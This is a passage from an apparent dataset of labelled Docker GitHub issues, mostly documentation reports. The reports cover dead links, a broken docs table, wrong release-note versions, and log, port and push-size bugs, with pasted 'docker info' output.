docker-init\r\ncontainerd version: 977c511eda0925a723debdc94d09459af49d082a\r\nrunc version: a01dafd48bc1c7cc12bdb01206f9fea7dd6feb70\r\ninit version: 949e6fa\r\nSecurity Options:\r\n seccomp\r\n  Profile: default\r\nKernel Version: 3.10.0-514.10.2.el7.x86_64\r\nOperating System: CentOS Linux 7 (Core)\r\nOSType: linux\r\nArchitecture: x86_64\r\nCPUs: 2\r\nTotal Memory: 3.695 GiB\r\nName: q4de3csye47\r\nID: 2FXY:XP3H:UWFL:3R7U:CF5H:THXJ:XC5K:SZTS:U4LV:AY7D:3JNV:FOJF\r\nDocker Root Dir: /docker\r\nDebug Mode (client): false\r\nDebug Mode (server): false\r\nHttp Proxy: ...\r\nHttps Proxy: ...\r\nNo Proxy: ...\r\nRegistry: https://index.docker.io/v1/\r\nExperimental: false\r\nInsecure Registries:\r\n ...\r\n 127.0.0.0/8\r\nLive Restore Enabled: false\r\n"},{"labels":["documentation",null],"text":"Hi!\r\n\r\nI wonder where I can find a PDF or other version of the current Docker documentation. I was unable to find it via Google and the official docs page. Probably I'm overlooking sth.?\r\n\r\nThanks for your help!"},{"labels":["documentation",null,null],"text":"Currently the plugin docs have a \"legacy\" doc which explains both the v1 discovery model as well as the RPC protocol for activation.\r\nThe v2 plugin doc doesn't really mention anything about how RPC is handled.\r\n\r\nBasically, getting started with plugins can be pretty confusing. Docs could use some love."},{"labels":["documentation",null,null],"text":"Consciously referring to Issue #29617, now Closed.\r\n\r\nThere *is* (in my humble opinion) an issue here.\r\n\r\nIt is a documentation issue.\r\n\r\nFollowing https://docs.docker.com/engine/getstarted/step_one/#step-3-verify-your-installation, at Step 3, sub-step 2, the command provided is\r\n\r\ndocker run hello-world\r\n\r\nNothing there indicates that there might be anything platform/architecture dependent.\r\n\r\nThis is in Verify your Installation. It is therefore likely to be followed verbatim by relatively uninformed potential users who might reasonably assume that a basic test should Just Work.\r\n\r\nIn fact the result is this:\r\npi@rpi2b ~ $ docker run hello-world\r\nstandard_init_linux.go:178: exec user process caused \"exec format error\"\r\n\r\nThe resulting error message is not handled in the linked 'Troubleshooting' section of the tutorial.\r\n\r\nThe workaround is\r\npi@rpi2b ~ $ docker run armhf/hello-world\r\n\r\nHello from Docker on armhf!\r\nThis message shows that your installation appears to be working correctly.\r\n\r\n\r\n\r\n"},{"labels":["documentation",null],"text":"<!--\r\nIf you are reporting a new issue, make sure that we do not have any duplicates\r\nalready open. You can ensure this by searching the issue list for this\r\nrepository. If there is a duplicate, please close your issue and add a comment\r\nto the existing issue instead.\r\n\r\nIf you suspect your issue is a bug, please edit your issue description to\r\ninclude the BUG REPORT INFORMATION shown below. If you fail to provide this\r\ninformation within 7 days, we cannot debug your issue and will close it. We\r\nwill, however, reopen it if you later provide the information.\r\n\r\nFor more information about reporting issues, see\r\nhttps://github.com/docker/docker/blob/master/CONTRIBUTING.md#reporting-other-issues\r\n\r\n---------------------------------------------------\r\nGENERAL SUPPORT INFORMATION\r\n---------------------------------------------------\r\n\r\nThe GitHub issue tracker is for bug reports and feature requests.\r\nGeneral support can be found at the following locations:\r\n\r\n- Docker Support Forums - https://forums.docker.com\r\n- IRC - irc.freenode.net #docker channel\r\n- Post a question on StackOverflow, using the Docker tag\r\n\r\n---------------------------------------------------\r\nBUG REPORT INFORMATION\r\n---------------------------------------------------\r\nUse the commands below to provide key information from your environment:\r\nYou do NOT have to include this information if this is a FEATURE REQUEST\r\n-->\r\n\r\n**Description**\r\n\r\nOne link in README.md file in the root directory of docker repository.\r\nIn [the getting the development builds section](https://github.com/docker/docker#getting-the-development-builds) , link \"docs.master.dockerproject.org.\" is dead.\r\n\r\n<!--\r\nBriefly describe the problem you are having in a few paragraphs.\r\n-->\r\n\r\n**Describe the results you received:**\r\nLink is dead\r\n\r\n**Describe the results you expected:**\r\nI think this link should be linked to docs.master.dockerproject main page.\r\n\r\n"},{"labels":["documentation",null,null],"text":"For example, hyperlink for [\"Docker build with --squash argument\"](https://github.com/docker/docker/blob/bd811aa4fde8632197c96ca3a7af039789768107/experimental/docker-build-with-squash.md) is broken: https://github.com/docker/docker/blob/bd811aa4fde8632197c96ca3a7af039789768107/experimental/README.md\r\n\r\n\r\nCan we detect such deadlinks on CI?\r\n"},{"labels":["documentation",null,null,null],"text":"There are several scripts in the [hack folder](https://github.com/docker/docker/tree/master/hack). It definitely deserves a good README 😄 "},{"labels":["documentation",null,null],"text":"When using `docker deploy` with a 3.2 compose version, it fails with \"unsupported Compose file version: 3.2\". I could not find any docs (especially on https://docs.docker.com/compose/compose-file/compose-versioning/#compatibility-matrix) on the required docker version to use the 3.2 compose.\r\n\r\n**Steps to reproduce the issue:**\r\n1. Create a compose file with version 3.2:\r\n```\r\n# compose-v32.yml\r\nversion: '3.2'\r\n  services:\r\n    myservice:\r\n    ...\r\n```\r\n2. Run `docker deploy -c compose-v32.yml mystack\r\n\r\n**Describe the results you received:**\r\nunsupported Compose file version: 3.2\r\n\r\n**Describe the results you expected:**\r\nCreated myservice\r\n\r\n**Output of `docker version`:**\r\n```\r\nClient:\r\nVersion:      17.03.1-ce\r\nAPI version:  1.27\r\nGo version:   go1.7.5\r\nGit commit:   c6d412e\r\nBuilt:        Fri Mar 24 00:00:50 2017\r\nOS/Arch:      linux/amd64\r\n\r\nServer:\r\nVersion:      17.03.1-ce\r\nAPI version:  1.27 (minimum version 1.12)\r\nGo version:   go1.7.5\r\nGit commit:   c6d412e\r\nBuilt:        Fri Mar 24 00:00:50 2017\r\nOS/Arch:      linux/amd64\r\nExperimental: true\r\n```\r\n**Output of `docker info`:**\r\n```\r\nContainers: 5\r\nRunning: 4\r\nPaused: 0\r\nStopped: 1\r\nImages: 6\r\nServer Version: 17.03.1-ce\r\nStorage Driver: overlay2\r\nBacking Filesystem: extfs\r\nSupports d_type: true\r\nNative Overlay Diff: true\r\nLogging Driver: syslog\r\nCgroup Driver: cgroupfs\r\nPlugins:\r\nVolume: local\r\nNetwork: bridge host ipvlan macvlan null overlay\r\nSwarm: active\r\nNodeID: mlc7uzdsvcnxkzi32437xybuv\r\nIs Manager: true\r\nClusterID: 6xjp4en70m49rkgt1u2jzo1fe\r\nManagers: 1\r\nNodes: 2\r\nOrchestration:\r\n Task History Retention Limit: 5\r\nRaft:\r\n Snapshot Interval: 10000\r\n Number of Old Snapshots to Retain: 0\r\n Heartbeat Tick: 1\r\n Election Tick: 3\r\nDispatcher:\r\n Heartbeat Period: 5 seconds\r\nCA Configuration:\r\n Expiry Duration: 3 months\r\nNode Address: 10.99.0.9\r\nManager Addresses:\r\n 10.99.0.9:2377\r\nRuntimes: runc\r\nDefault Runtime: runc\r\nInit Binary: docker-init\r\ncontainerd version: 4ab9917febca54791c5f071a9d1f404867857fcc\r\nrunc version: 54296cf40ad8143b62dbcaa1d90e520a2136ddfe\r\ninit version: N/A (expected: 949e6facb77383876aeff8a6944dde66b3089574)\r\nSecurity Options:\r\nseccomp\r\n Profile: default\r\nKernel Version: 4.9.13-moby\r\nOperating System: Alpine Linux v3.5\r\nOSType: linux\r\nArchitecture: x86_64\r\nCPUs: 1\r\nTotal Memory: 3.354 GiB\r\nName: swarm-manager000000\r\nID: YLGP:ANHJ:ODKD:DZXG:YOG3:XA2Y:VVLK:LZ2M:N2NS:7PCF:STL5:DKVL\r\nDocker Root Dir: /var/lib/docker\r\nDebug Mode (client): false\r\nDebug Mode (server): true\r\nFile Descriptors: 276\r\nGoroutines: 372\r\nSystem Time: 2017-04-04T14:33:05.635698193Z\r\nEventsListeners: 0\r\nRegistry: https://index.docker.io/v1/\r\nExperimental: true\r\nInsecure Registries:\r\n127.0.0.0/8\r\nLive Restore Enabled: false\r\n```\r\n**Additional environment details (AWS, VirtualBox, physical, etc.):**\r\nSwarm Mode running on Azure Container Services."},{"labels":[null,"documentation",null],"text":"<!--\r\nIf you are reporting a new issue, make sure that we do not have any duplicates\r\nalready open. You can ensure this by searching the issue list for this\r\nrepository. If there is a duplicate, please close your issue and add a comment\r\nto the existing issue instead.\r\n\r\nIf you suspect your issue is a bug, please edit your issue description to\r\ninclude the BUG REPORT INFORMATION shown below. If you fail to provide this\r\ninformation within 7 days, we cannot debug your issue and will close it. We\r\nwill, however, reopen it if you later provide the information.\r\n\r\nFor more information about reporting issues, see\r\nhttps://github.com/docker/docker/blob/master/CONTRIBUTING.md#reporting-other-issues\r\n\r\n---------------------------------------------------\r\nGENERAL SUPPORT INFORMATION\r\n---------------------------------------------------\r\n\r\nThe GitHub issue tracker is for bug reports and feature requests.\r\nGeneral support can be found at the following locations:\r\n\r\n- Docker Support Forums - https://forums.docker.com\r\n- IRC - irc.freenode.net #docker channel\r\n- Post a question on StackOverflow, using the Docker tag\r\n\r\n---------------------------------------------------\r\nBUG REPORT INFORMATION\r\n---------------------------------------------------\r\nUse the commands below to provide key information from your environment:\r\nYou do NOT have to include this information if this is a FEATURE REQUEST\r\n-->\r\n\r\n**Description**\r\n\r\nLinks property always is null, even whether the container has links.\r\n\r\n**Steps to reproduce the issue:**\r\n1. `docker run --net=dore-network -d --name node1 busybox tail -f /dev/null`\r\n2. `docker run --net=dore-network --link node1 -d --name node2 busybox tail -f /dev/null`\r\n3. `docker inspect node2`\r\n4. `curl --unix-socket /var/run/docker.sock http:/v1.26/containers/json | grep Links`\r\n\r\n**Describe the results you received:**\r\n\r\ninspect command:\r\n\r\n```\r\n...\r\n\"Networks\": {\r\n  \"dore-network\": {\r\n    ....\r\n    \"Links\": [\r\n      \"node1\"\r\n    ],\r\n    ...\r\n    }\r\n  }\r\n....\r\n```\r\n\r\nwith cURL command:\r\n\r\n```\r\n[{\"Id\":\"a43c96d41cacad628b5a51860650aa123c25416e16c563790a8eb76001d1b86f\",\"Names\":[\"/node2\"],\"Image\":\"busybox\",\"ImageID\":\"sha256:00f017a8c2a6e1fe2ffd05c281f27d069d2a99323a8cd514dd35f228ba26d2ff\",\"Command\":\"tail -f /dev/null\",\"Created\":1491275358,\"Ports\":[],\"Labels\":{},\"State\":\"running\",\"Status\":\"Up About a minute\",\"HostConfig\":{\"NetworkMode\":\"dore-network\"},\"NetworkSettings\":{\"Networks\":{\"dore-network\":{\"IPAMConfig\":null,\"Links\":null,\"Aliases\":null,\"NetworkID\":\"0c312941cff131e01bc038a9e7d196a0faf77c03ed38c365715755dc3c61b2ae\",\"EndpointID\":\"62df24f75be4a2b47eba58802c76417dc4cc6bb0a8b07c5908e2269e6bc0aa8a\",\"Gateway\":\"172.18.0.1\",\"IPAddress\":\"172.18.0.3\",\"IPPrefixLen\":16,\"IPv6Gateway\":\"\",\"GlobalIPv6Address\":\"\",\"GlobalIPv6PrefixLen\":0,\"MacAddress\":\"02:42:ac:12:00:03\"}}},\"Mounts\":[]},{\"Id\":\"3640df7f388ee551cb00b8c9040cca240e89891b2f11235943567e533b1f013e\",\"Names\":[\"/node1\"],\"Image\":\"busybox\",\"ImageID\":\"sha256:00f017a8c2a6e1fe2ffd05c281f27d069d2a99323a8cd514dd35f228ba26d2ff\",\"Command\":\"tail -f /dev/null\",\"Created\":1491275350,\"Ports\":[],\"Labels\":{},\"State\":\"running\",\"Status\":\"Up About a minute\",\"HostConfig\":{\"NetworkMode\":\"dore-network\"},\"NetworkSettings\":{\"Networks\":{\"dore-network\":{\"IPAMConfig\":null,\"Links\":null,\"Aliases\":null,\"NetworkID\":\"0c312941cff131e01bc038a9e7d196a0faf77c03ed38c365715755dc3c61b2ae\",\"EndpointID\":\"164c2b50d545660089b0eacb98a90e7334ebdbeca7cc16ce4448d283e644b076\",\"Gateway\":\"172.18.0.1\",\"IPAddress\":\"172.18.0.2\",\"IPPrefixLen\":16,\"IPv6Gateway\":\"\",\"GlobalIPv6Address\":\"\",\"GlobalIPv6PrefixLen\":0,\"MacAddress\":\"02:42:ac:12:00:02\"}}},\"Mounts\":[]}]\r\n```\r\n\r\n**Describe the results you expected:**\r\n\r\nInspect and Curl must be consistent. Curl response should have the Links information.\r\n\r\n**Output of `docker version`:**\r\n\r\n```\r\nClient:\r\n Version:      1.13.1\r\n API version:  1.26\r\n Go version:   go1.7.5\r\n Git commit:   092cba3\r\n Built:        Wed Feb  8 06:50:14 2017\r\n OS/Arch:      linux/amd64\r\n\r\nServer:\r\n Version:      1.13.1\r\n API version:  1.26 (minimum version 1.12)\r\n Go version:   go1.7.5\r\n Git commit:   092cba3\r\n Built:        Wed Feb  8 06:50:14 2017\r\n OS/Arch:      linux/amd64\r\n Experimental: false\r\n```\r\n\r\n**Output of `docker info`:**\r\n\r\n```\r\nContainers: 2\r\n Running: 2\r\n Paused: 0\r\n Stopped: 0\r\nImages: 33\r\nServer Version: 1.13.1\r\nStorage Driver: aufs\r\n Root Dir: /var/lib/docker/aufs\r\n Backing Filesystem: extfs\r\n Dirs: 171\r\n Dirperm1 Supported: true\r\nLogging Driver: json-file\r\nCgroup Driver: cgroupfs\r\nPlugins: \r\n Volume: local\r\n Network: bridge host macvlan null overlay\r\nSwarm: inactive\r\nRuntimes: runc\r\nDefault Runtime: runc\r\nInit Binary: docker-init\r\ncontainerd version: aa8187dbd3b7ad67d8e5e3a15115d3eef43a7ed1\r\nrunc version: 9df8b306d01f59d3a8029be411de015b7304dd8f\r\ninit version: 949e6fa\r\nSecurity Options:\r\n apparmor\r\n seccomp\r\n  Profile: default\r\nKernel Version: 4.4.0-71-generic\r\nOperating System: Ubuntu 16.04.2 LTS\r\nOSType: linux\r\nArchitecture: x86_64\r\nCPUs: 4\r\nTotal Memory: 7.75 GiB\r\nName: my name\r\nID: Y4B7:ICGF:AXJG:HHJT:6LUD:W3IA:FUAY:TZNX:LYXF:U3V3:VI2R:5UF6\r\nDocker Root Dir: /var/lib/docker\r\nDebug Mode (client): false\r\nDebug Mode (server): false\r\nRegistry: https://index.docker.io/v1/\r\nWARNING: No swap limit support\r\nExperimental: false\r\nInsecure Registries:\r\n 127.0.0.0/8\r\nLive Restore Enabled: false\r\n```\r\n"},{"labels":[null,"documentation",null,null],"text":"---------------------------------------------------\r\nBUG REPORT INFORMATION\r\n---------------------------------------------------\r\n**Description**\r\nUsing the `--since` and `--tail` flags with the command line tool, or the `since` or `tail` parameters via the API, does not yield expected results.\r\n\r\n**Steps to reproduce the issue:**\r\nThe following is true for either the cli or the API, but I'll describe it for the cli to keep things simple:\r\n\r\n1. Run `docker service logs --tail 1 [SERVICE]` or `docker service logs [1491249483 || 1m10s etc.] [SERVICE]`\r\n\r\n**Describe the results you received:**\r\nMany lines returned, and in the case of failing services which are retrying every n seconds, this is _thousands_ of lines.\r\n\r\n**Describe the results you expected:**\r\nWith `--tail 1`, only 1 line returned. With `--since [TIMESTAMP]` only lines returned since that timestamp.\r\n\r\n**Additional information you deem important (e.g. issue happens only occasionally):**\r\nIt seems that the extra lines are the result of grabbing logs from all service tasks, though I could be wrong.\r\n\r\nQuerying the individual containers created by the `docker service` command, the `--tail` and `--since` options work as expected.\r\n\r\n**Output of `docker version`:**\r\n\r\nOutput is from my Mac, but the same thing happens for the same version on Linux:\r\n```\r\nClient:\r\n Version:      17.03.1-ce\r\n API version:  1.27\r\n Go version:   go1.7.5\r\n Git commit:   c6d412e\r\n Built:        Tue Mar 28 00:40:02 2017\r\n OS/Arch:      darwin/amd64\r\n\r\nServer:\r\n Version:      17.03.1-ce\r\n API version:  1.27 (minimum version 1.12)\r\n Go version:   go1.7.5\r\n Git commit:   c6d412e\r\n Built:        Fri Mar 24 00:00:50 2017\r\n OS/Arch:      linux/amd64\r\n Experimental: true\r\n```\r\n\r\n**Output of `docker info`:**\r\n\r\nAgain this is from my Mac, but the tests were also performed on Linux with a proper swarm, with the same results:\r\n```\r\nContainers: 6                                                                                                                                                             [25/4682]\r\n Running: 1\r\n Paused: 0\r\n Stopped: 5\r\nImages: 350\r\nServer Version: 17.03.1-ce\r\nStorage Driver: overlay2\r\n Backing Filesystem: extfs\r\n Supports d_type: true\r\n Native Overlay Diff: true\r\nLogging Driver: json-file\r\nCgroup Driver: cgroupfs\r\nPlugins: \r\n Volume: local\r\n Network: bridge host ipvlan macvlan null overlay\r\nSwarm: active\r\n NodeID: mp9up3hu4ik275i4nl23hx1zv\r\n Is Manager: true\r\n ClusterID: flbky82mvb51ngvbmb3a0pvqn\r\n Managers: 1\r\n Nodes: 1\r\n Orchestration:\r\n  Task History Retention Limit: 5\r\n Raft:\r\n  Snapshot Interval: 10000\r\n  Number of Old Snapshots to Retain: 0\r\n  Heartbeat Tick: 1\r\n  Election Tick: 3\r\n Dispatcher:\r\n  Heartbeat Period: 5 seconds\r\n CA Configuration:\r\n  Expiry Duration: 3 months\r\n Node Address: 192.168.65.2\r\n Manager Addresses:\r\n  192.168.65.2:2377\r\nRuntimes: runc\r\nDefault Runtime: runc\r\nInit Binary: docker-init\r\ncontainerd version: 4ab9917febca54791c5f071a9d1f404867857fcc\r\nrunc version: 54296cf40ad8143b62dbcaa1d90e520a2136ddfe\r\ninit version: N/A (expected: 949e6facb77383876aeff8a6944dde66b3089574)\r\nSecurity Options:\r\n seccomp\r\n  Profile: default\r\nKernel Version: 4.9.13-moby\r\nOperating System: Alpine Linux v3.5\r\nOSType: linux\r\nArchitecture: x86_64\r\nCPUs: 2\r\nTotal Memory: 1.952 GiB\r\nName: moby\r\nID: IJXO:PQVJ:Z5IQ:AV2T:PNJX:B5IK:L3FW:EOFM:TLUX:WM56:GTBA:GH4W\r\nDocker Root Dir: /var/lib/docker\r\nDebug Mode (client): false\r\nDebug Mode (server): true\r\n File Descriptors: 39\r\n Goroutines: 143\r\n System Time: 2017-04-03T19:46:12.33482745Z\r\n EventsListeners: 2\r\nNo Proxy: *.local, 169.254/16\r\nUsername: afrazkhan\r\nRegistry: https://index.docker.io/v1/\r\nExperimental: true\r\nInsecure Registries:\r\n 127.0.0.0/8\r\nLive Restore Enabled: false\r\n```\r\n"},{"labels":["documentation",null],"text":"https://github.com/docker/docker/blob/17.03.x/docs/reference/commandline/service_create.md\r\n![image](https://cloud.githubusercontent.com/assets/1900106/24601239/6c42dcac-1858-11e7-8cfe-79ca04a46b90.png)\r\nOK with no issues\r\n\r\nhttps://docs.docker.com/engine/reference/commandline/service_create/#specify-service-constraints---constraint\r\n![image](https://cloud.githubusercontent.com/assets/1900106/24601250/79eaf074-1858-11e7-929f-b6a20e74b064.png)\r\nTable is messed up\r\nAnd `<tdnode.role</td>` is above the table\r\n\r\nThis is the table in HTML:\r\n```html\r\n<table>\r\n  <tr>\r\n    <th>node attribute</th>\r\n    <th>matches</th>\r\n    <th>example</th>\r\n  </tr>\r\n  <tr>\r\n    <td><tt>node.id</tt></td>\r\n    <td>Node ID</td>\r\n    <td><tt>node.id == 2ivku8v2gvtg4</tt></td>\r\n  </tr>\r\n  <tr>\r\n    <td><tt>node.hostname</tt></td>\r\n    <td>Node hostname</td>\r\n    <td><tt>node.hostname != node-2</tt></td>\r\n  </tr>\r\n  <tr>\r\n    &lt;td<tt>node.role</tt>&lt;/td&gt;\r\n    <td><tt>node role: manager</tt></td>\r\n    <td><tt>node.role == manager</tt></td>\r\n  </tr>\r\n  <tr>\r\n    <td><tt>node.labels</tt></td>\r\n    <td>user defined node labels</td>\r\n    <td><tt>node.labels.security == high</tt></td>\r\n  </tr>\r\n  <tr>\r\n    <td><tt>engine.labels</tt></td>\r\n    <td>Docker Engine's labels</td>\r\n    <td><tt>engine.labels.operatingsystem == ubuntu 14.04</tt></td>\r\n  </tr>\r\n</table>\r\n```"},{"labels":["documentation",null,null],"text":"Wrong containerd version in release notes for release v17.03.1-ce:\r\n```\r\nUpdate containerd to 595e75c212d19a81d2b808a518fe1afc1391dad5 #31662\r\n```\r\n(https://github.com/docker/docker/pull/31662/commits/74c52a7bab45f63defdbe4c33ec5c77416f2ecf7)\r\n\r\nBut here version changed to 4ab9917febca54791c5f071a9d1f404867857fcc:\r\nhttps://github.com/docker/docker/commit/00132cc4426d7914822b98f952d32a45b015485e"},{"labels":["documentation",null,null],"text":"platform: docker toobox for windows 17.0.03\r\n\r\nWhen running a container with a mount from a host drive, the docker host folder contents overwrites the container's folder contents entirely. There is no overlay of data as detailed in the docs.\r\n\r\nmy ubuntu container command: \r\n\r\n> docker run -d -P --name MYCONTAINER -v /c/Users/drupal8_www:/var/www/html MY:IMAGE\r\n\r\nby stopping and starting this i can clearly see and repeat the effect describe above.\r\n\r\nthanks"},{"labels":[null,"documentation",null,null],"text":"**Description**\r\n\r\nPushing a docker image pushes significantly more data than pulling\r\n\r\n**Steps to reproduce the issue:**\r\n1. build an easily compressible image (e.g. https://github.com/frankh/docker-compress-test)\r\n2. docker push it\r\n  * Note how much it uploads. In my case, it's ~40MB\r\n3. delete the image and docker pull\r\n  * Note how much it downloads. In my case, ~40KB\r\n\r\n**Describe the results you received:**\r\n\r\nPushing pushes significantly more data than pulling\r\n\r\n**Describe the results you expected:**\r\n\r\nPushing and pulling move roughly the same amount of data\r\n\r\n**Output of `docker version`:**\r\n\r\nDocker version 17.03.0-ce, build 60ccb22\r\n\r\n**Output of `docker info`:**\r\n\r\n```\r\nContainers: 34\r\n Running: 2\r\n Paused: 0\r\n Stopped: 32\r\nImages: 1355\r\nServer Version: 17.03.0-ce\r\nStorage Driver: overlay2\r\n Backing Filesystem: extfs\r\n Supports d_type: true\r\n Native Overlay Diff: true\r\nLogging Driver: json-file\r\nCgroup Driver: cgroupfs\r\nPlugins:\r\n Volume: local\r\n Network: bridge host ipvlan macvlan null overlay\r\nSwarm: inactive\r\nRuntimes: runc\r\nDefault Runtime: runc\r\nInit Binary: docker-init\r\ncontainerd version: 977c511eda0925a723debdc94d09459af49d082a\r\nrunc version: a01dafd48bc1c7cc12bdb01206f9fea7dd6feb70\r\ninit version: 949e6fa\r\nSecurity Options:\r\n seccomp\r\n  Profile: default\r\nKernel Version: 4.9.12-moby\r\nOperating System: Alpine Linux v3.5\r\nOSType: linux\r\nArchitecture: x86_64\r\nCPUs: 2\r\nTotal Memory: 1.952 GiB\r\nName: moby\r\nID: CXWS:GVKV:ICYK:NJ7L:26LZ:DOYO:OBL4:NDAW:4TLZ:J2TJ:XML7:VDR2\r\nDocker Root Dir: /var/lib/docker\r\nDebug Mode (client): false\r\nDebug Mode (server): true\r\n File Descriptors: 33\r\n Goroutines: 40\r\n System Time: 2017-03-22T10:22:34.60882776Z\r\n EventsListeners: 1\r\nNo Proxy: *.local, 169.254/16\r\nUsername: frankh\r\nRegistry: https://index.docker.io/v1/\r\nExperimental: true\r\nInsecure Registries:\r\n 127.0.0.0/8\r\nLive Restore Enabled: false\r\n```\r\n\r\n**Additional environment details (AWS, VirtualBox, physical, etc.):**\r\n\r\nDocker for mac (also reproducible on other platforms)"},{"labels":[null,"documentation",null,null],"text":"**Description**\r\n\r\nThe `DiskUsage` call (which backs `docker system df`) can take an extremely long time to finish, since it walks through every container and volume's filesystem. In cases where you have lots of containers or volumes with lots of files, we've seen `DiskUsage` take minutes or even hours to complete, chewing up CPU and disk I/O the whole time. This isn't necessarily incorrect behavior, per se, but it is at least very surprising, especially since `ContainerStats` isn't expensive at all.\r\n\r\nI'm not sure how feasible it would be to improve the performance of `DiskUsage`, but if that's not possible, there should be more messaging around the costs of this API call.\r\n\r\nAlso, is there any way to get the size of an individual volume, or can you only get the size of every volume at once with `DiskUsage`?"},{"labels":["documentation",null,null,null,null],"text":"<!--\r\nIf you are reporting a new issue, make sure that we do not have any duplicates\r\nalready open. You can ensure this by searching the issue list for this\r\nrepository. If there is a duplicate, please close your issue and add a comment\r\nto the existing issue instead.\r\n\r\nIf you suspect your issue is a bug, please edit your issue description to\r\ninclude the BUG REPORT INFORMATION shown below. If you fail to provide this\r\ninformation within 7 days, we cannot debug your issue and will close it. We\r\nwill, however, reopen it if you later provide the information.\r\n\r\nFor more information about reporting issues, see\r\nhttps://github.com/docker/docker/blob/master/CONTRIBUTING.md#reporting-other-issues\r\n\r\n---------------------------------------------------\r\nGENERAL SUPPORT INFORMATION\r\n---------------------------------------------------\r\n\r\nThe GitHub issue tracker is for bug reports and feature requests.\r\nGeneral support can be found at the following locations:\r\n\r\n- Docker Support Forums - https://forums.docker.com\r\n- IRC - irc.freenode.net #docker channel\r\n- Post a question on StackOverflow, using the Docker tag\r\n\r\n---------------------------------------------------\r\nBUG REPORT INFORMATION\r\n---------------------------------------------------\r\nUse the commands below to provide key information from your environment:\r\nYou do NOT have to include this information if this is a FEATURE REQUEST\r\n-->\r\n\r\n**Description**\r\nWhen a container uses `--restart=always -p` the port changes with every automatic restart. This was not the case with `v1.13` - is this intentional?\r\n\r\n**Steps to reproduce the issue:**\r\n1. `docker run --restart=always -p 8000 debian:jessie sleep 2`\r\n2. Run `docker ps` a couple times to check the assigned port\r\n\r\n**Describe the results you received:**\r\nThe port changes with every restart\r\n\r\n**Describe the results you expected:**\r\nThe port should probably stay the same\r\n\r\n**Output of `docker version`:**\r\n\r\n```\r\nClient:\r\n Version:      17.03.0-ce\r\n API version:  1.26\r\n Go version:   go1.7.5\r\n Git commit:   60ccb22\r\n Built:        Thu Feb 23 10:54:03 2017\r\n OS/Arch:      linux/amd64\r\n\r\nServer:\r\n Version:      17.03.0-ce\r\n API version:  1.26 (minimum version 1.12)\r\n Go version:   go1.7.5\r\n Git commit:   60ccb22\r\n Built:        Thu Feb 23 10:54:03 2017\r\n OS/Arch:      linux/amd64\r\n Experimental: false\r\n```\r\n\r\n**Output of `docker info`:**\r\n\r\n```\r\nContainers: 43\r\n Running: 38\r\n Paused: 0\r\n Stopped: 5\r\nImages: 27\r\nServer Version: 17.03.0-ce\r\nStorage Driver: devicemapper\r\n Pool Name: data-docker_thin\r\n Pool Blocksize: 65.54 kB\r\n Base Device Size: 10.74 GB\r\n Backing Filesystem: xfs\r\n Data file:\r\n Metadata file:\r\n Data Space Used: 14.39 GB\r\n Data Space Total: 96.64 GB\r\n Data Space Available: 82.25 GB\r\n Metadata Space Used: 21.34 MB\r\n Metadata Space Total: 536.9 MB\r\n Metadata Space Available: 515.5 MB\r\n Thin Pool Minimum Free Space: 9.664 GB\r\n Udev Sync Supported: true\r\n Deferred Removal Enabled: true\r\n Deferred Deletion Enabled: true\r\n Deferred Deleted Device Count: 0\r\n Library Version: 1.02.135-RHEL7 (2016-11-16)\r\nLogging Driver: journald\r\nCgroup Driver: cgroupfs\r\nPlugins:\r\n Volume: local\r\n Network: bridge host macvlan null overlay\r\nSwarm: inactive\r\nRuntimes: runc\r\nDefault Runtime: runc\r\nInit Binary: docker-init\r\ncontainerd version: 977c511eda0925a723debdc94d09459af49d082a\r\nrunc version: a01dafd48bc1c7cc12bdb01206f9fea7dd6feb70\r\ninit version: 949e6fa\r\nSecurity Options:\r\n seccomp\r\n  Profile: default\r\nKernel Version: 3.10.0-514.6.2.el7.x86_64\r\nOperating System: CentOS Linux 7 (Core)\r\nOSType: linux\r\nArchitecture: x86_64\r\nCPUs: 2\r\nTotal Memory: 7.305 GiB\r\nName: us-1\r\nID: 6UKZ:VSEG:Z6FX:3A7K:YS6F:HUMA:HWFR:7D3L:IZIG:OVT4:33FA:GNDN\r\nDocker Root Dir: /var/lib/docker\r\nDebug Mode (client): false\r\nDebug Mode (server): false\r\nRegistry: https://index.docker.io/v1/\r\nWARNING: IPv4 forwarding is disabled\r\nWARNING: bridge-nf-call-iptables is disabled\r\nWARNING: bridge-nf-call-ip6tables is disabled\r\nExperimental: false\r\nInsecure Registries:\r\n 127.0.0.0/8\r\nLive Restore Enabled: true\r\n```\r\n\r\n"},{"labels":["documentation",null],"text":"<!--\r\nIf you are reporting a new issue, make sure that we do not have any duplicates\r\nalready open. You can ensure this by searching the issue list for this\r\nrepository. If there is a duplicate, please close your issue and add a comment\r\nto the existing issue instead.\r\n\r\nIf you suspect your issue is a bug, please edit your issue description to\r\ninclude the BUG REPORT INFORMATION shown below. If you fail to provide this\r\ninformation within 7 days, we cannot debug your issue and will close it. We\r\nwill, however, reopen it if you later provide the information.\r\n\r\nFor more information about reporting issues, see\r\nhttps://github.com/docker/docker/blob/master/CONTRIBUTING.md#reporting-other-issues\r\n\r\n---------------------------------------------------\r\nGENERAL SUPPORT INFORMATION\r\n---------------------------------------------------\r\n\r\nThe GitHub issue tracker is for bug reports and feature requests.\r\nGeneral support can be found at the following locations:\r\n\r\n- Docker Support Forums - https://forums.docker.com\r\n- IRC - irc.freenode.net #docker channel\r\n- Post a question on StackOverflow, using the Docker tag\r\n\r\n---------------------------------------------------\r\nBUG REPORT INFORMATION\r\n---------------------------------------------------\r\nUse the commands below to provide key information from your environment:\r\nYou do NOT have to include this information if this is a FEATURE REQUEST\r\n-->\r\n\r\n**Description**\r\n\r\nThe [docs here](https://github.com/docker/docker/blob/master/docs/reference/commandline/inspect.md#get-an-instances-image-name) on how to \"Get an instance's image name\" are wrong.\r\n\r\n**Steps to reproduce the issue:**\r\n1. run `docker inspect --format='{{.Container.Spec.Image}}' <container ID>`\r\n\r\n**Describe the results you received:**\r\n\r\n```\r\nTemplate parsing error: template: :1:12: executing \"\" at <.Container.Spec.Imag...>: map has no entry for key \"Container\"\r\n```\r\n\r\n**Describe the results you expected:**\r\n\r\nI expect to the command to return an image name.\r\n\r\n**Additional information you deem important (e.g. issue happens only occasionally):**\r\n\r\n**Output of `docker version`:**\r\n\r\n```\r\ndocker version\r\n\r\nClient:\r\n Version:      1.12.3\r\n API version:  1.24\r\n Go version:   go1.6.3\r\n Git commit:   6b644ec\r\n Built:        Wed Oct 26 21:44:32 2016\r\n OS/Arch:      linux/amd64\r\n\r\nServer:\r\n Version:      1.12.3\r\n API version:  1.24\r\n Go version:   go1.6.3\r\n Git commit:   6b644ec\r\n Built:        Wed Oct 26 21:44:32 2016\r\n OS/Arch:      linux/amd64\r\n```\r\n\r\n**Output of `docker 